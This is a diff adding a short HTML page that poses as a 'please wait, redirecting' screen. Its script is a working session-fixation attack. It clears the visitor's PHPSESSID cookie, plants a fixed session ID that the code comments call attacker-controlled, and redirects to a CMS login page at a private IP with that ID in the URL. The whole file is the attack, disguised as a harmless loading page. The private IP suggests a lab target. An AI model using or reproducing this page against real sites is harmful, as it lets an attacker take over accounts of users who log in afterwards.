@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+  <meta charset="UTF-8">
+  <title>請稍候，系統導向中...</title>
+  <script>
+    // 清除原本的 PHPSESSID cookie
+    document.cookie = "PHPSESSID=; path=/; expires=Thu, 01 Jan 1970 00:00:00 UTC;";
+
+    // 設定攻擊者控制的 PHPSESSID
+    document.cookie = "PHPSESSID=vrss3vf17rcm470ce2vfv9d6hgt; path=/;";
+
+    // 導向目標網站
+    window.location.href = "http://192.168.1.110/cms/login.php?PHPSESSID=vrss3vf17rcm470ce2vfv9d6hgt";
+  </script>
+</head>
+<body>
+  <p>正在導向至系統，請稍候...</p>
+</body>
+</html>
